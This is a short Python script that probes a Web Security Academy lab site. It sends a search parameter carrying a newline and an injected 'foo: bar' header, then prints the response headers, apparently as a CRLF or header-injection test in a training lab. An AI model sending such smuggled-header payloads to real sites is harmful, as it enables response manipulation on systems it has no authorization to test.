import requests
import sys
from bs4 import BeautifulSoup
import urllib.parse


def getHeadersFromSearch(search_term):
    site = 'acd81f611e5960bfc0bd160000ce0027.web-security-academy.net'
    resp = requests.get(f"https://{site}/?search={search_term}")
    for header in resp.headers.items():
        print(header)

getHeadersFromSearch("<madler>\nfoo: bar")